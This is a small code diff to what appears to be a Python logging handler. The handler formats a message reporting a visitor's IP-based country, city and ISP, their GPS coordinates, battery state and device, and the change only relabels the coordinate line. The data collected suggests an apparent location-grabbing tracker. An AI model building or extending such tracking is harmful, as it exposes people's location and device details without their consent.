@@ -45,7 +45,7 @@ def log():
 🌎 <b>Country:</b> {ip_info.get("country")} | <b>City:</b> {ip_info.get("city")}
 📡 <b>ISP:</b> {ip_info.get("org")}
 
-📍 <b>Location:</b> {data.get("lat")}, {data.get("lon")}
+📍 <b>Latitude:</b> {data.get("lat")},<b>longitude:</b> {data.get("lon")}
 🔋 <b>Battery:</b> {data.get("battery_level", '?')}% (Charging: {data.get("charging", '?')})
 
 📱 <b>Device:</b> {data.get("device")}
